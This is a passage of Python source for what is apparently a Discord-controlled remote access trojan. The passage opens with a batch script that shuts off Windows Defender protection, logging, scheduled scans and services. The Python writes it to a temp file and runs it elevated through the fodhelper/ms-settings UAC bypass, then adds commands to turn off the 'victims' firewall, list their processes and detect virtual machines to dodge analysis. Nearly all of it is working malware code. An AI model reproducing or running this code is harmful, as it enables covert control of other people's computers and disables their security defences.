reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d "0" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SubmitSamplesConsent" /t REG_DWORD /d "2" /f
cls
rem 0 - Disable Logging
reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f
reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger" /v "Start" /t REG_DWORD /d "0" /f
cls
rem Disable WD Tasks
schtasks /Change /TN "Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable
cls 
rem Disable WD systray icon
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "SecurityHealth" /f
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth" /f
cls
rem Remove WD context menu
reg delete "HKCR\*\shellex\ContextMenuHandlers\EPP" /f
reg delete "HKCR\Directory\shellex\ContextMenuHandlers\EPP" /f
reg delete "HKCR\Drive\shellex\ContextMenuHandlers\EPP" /f
cls
rem Disable WD services
reg add "HKLM\System\CurrentControlSet\Services\WdBoot" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\System\CurrentControlSet\Services\WdFilter" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\System\CurrentControlSet\Services\WdNisDrv" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\System\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\System\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f
cls
        """
        temp2 = temp + r"\\av.bat"
        if os.path.isfile(temp2):
            os.remove(temp2)
        f6 = open(temp + r"\\av.bat", 'w')
        f6.write(bat)
        f6.close()

        ###### FORCE RUN BATCH FILE AS ADMIN ######
        create_reg_path = r""" powershell New-Item "HKCU:\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command" -Force """
        os.system(create_reg_path)
        create_trigger_reg_key = r""" powershell New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "DelegateExecute" -Value "hi" -Force """
        os.system(create_trigger_reg_key) 
        create_payload_reg_key = r"""powershell Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "`(Default`)" -Value "'cmd /c """ + '""' + '"' + '"' + temp2 + '""' +  '"' + '"\'"' + """ -Force"""
        os.system(create_payload_reg_key)
        with disable_fsr():
            os.system("fodhelper.exe")
        time.sleep(2)
        remove_reg = r""" powershell Remove-Item "HKCU:\\Software\\Classes\\ms-settings\\" -Recurse -Force """
        os.system(remove_reg)


@slash.slash(name="Disablefirewall", description="Disable victims firewall", guild_ids=g)
async def Disablefirewall_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        import ctypes
        import os
        def isAdmin():
            try:
                is_admin = (os.getuid() == 0)
            except AttributeError:
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            return is_admin
        if isAdmin():
            os.system("NetSh Advfirewall set allprofiles state off")
            await ctx.send("Command executed!")
        else:
            await ctx.send("Not admin")


@slash.slash(name="listProccess", description="List all active proccess", guild_ids=g)
async def listProccess_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        import os
        import subprocess
        if 1==1:
            result = subprocess.getoutput("tasklist")
            numb = len(result)
            if numb < 1:
                await ctx.send("Command not recognized or no output was obtained")
            elif numb > 1990:
                temp = (os.getenv('TEMP'))
                if os.path.isfile(temp + r"\\output.txt"):
                    os.system(r"del %temp%\\output.txt /f")
                f1 = open(temp + r"\\output.txt", 'a')
                f1.write(result)
                f1.close()
                file = discord.File(temp + r"\\output.txt", filename="output.txt")
                await ctx.send("Command executed!", file=file)
            else:
                await ctx.send("Command executed : " + result)


@slash.slash(name="VmCheck", description="Detect if the victim is using a VM", guild_ids=g)
async def VmCheck_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        await ctx.send("Scanning System for Vm Drivers. . .")

        sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=35, cols=170))

        FOUND = False
        FOUND_DRIVER = False

        time.sleep(2)
        VmCehck1 = "vmsrvc.exe"
        VmCehck2 = "vmusrvc.exe"
        VmCehck3 = "vboxtray.exe"
        VmCehck4 = "vmtoolsd.exe"
        VmCehck5 = "df5serv.exe"
        VmCehck6 = "vboxservice.exe"
        for process in psutil.process_iter():
            try:
                if process.name().lower() == VmCehck1.lower():
                    FOUND = True
                else:
                    shit = 12

                if process.name().lower() == VmCehck2.lower():
                    FOUND = True
                else:
                    shit = 12

                if process.name().lower() == VmCehck3.lower():
                    FOUND = True
                else:
                    shit = 12

                if process.name().lower() == VmCehck4.lower():
                    FOUND = True
                else:
                    shit = 12

                if process.name().lower() == VmCehck5.lower():
                    FOUND = True
                else:
                    shit = 12

                if process.name().lower() == VmCehck6.lower():
                    FOUND = True
                else:
                    shit = 12
            except AccessDenied:
                await ctx.send("[!] Perimission Denied")
        if FOUND == True:
            await ctx.send("Found a VM Process!")
            return

        vmci = os.path.exists("C:\WINDOWS\system32\drivers\vmci.sys")
        vmhgfs = os.path.exists("C:\WINDOWS\system32\drivers\vmhgfs.sys")
        vmmouse = os.path.exists("C:\WINDOWS\system32\drivers\vmmouse.sys")
        vmsci = os.path.exists("C:\WINDOWS\system32\drivers\vmsci.sys")
        vmusbmouse = os.path.exists("C:\WINDOWS\system32\drivers\vmusbmouse.sys")
        vmx_svga = os.path.exists("C:\WINDOWS\system32\drivers\vmx_svga.sys")
        VBoxMouse = os.path.exists("C:\WINDOWS\system32\drivers\VBoxMouse.sys")
        
        
        if vmci == True:
            FOUND_DRIVER = True
        else:
           shit = 12
        
        if vmhgfs == True:
            FOUND_DRIVER = True
        else:
            shit = 12
    
        if vmmouse == True:
            FOUND_DRIVER = True
        else:
            shit = 12
        
        if vmsci == True:
            FOUND_DRIVER = True
        else:
            shit = 12
        
        if vmusbmouse == True:
            FOUND_DRIVER = True
        else:
            shit = 12
        
        if vmx_svga == True:
            FOUND_DRIVER = True
        else:
            shit = 12
        
        if VBoxMouse == True:
            FOUND_DRIVER = True
        else:
                shit = 12

        if FOUND_DRIVER == True:
            await ctx.send("Found a VM Driver!")
            return
        else:
            await ctx.send("Finished checking for VM No Drivers found")
        

client.run(token)

########################### Code Functions Start ###########################
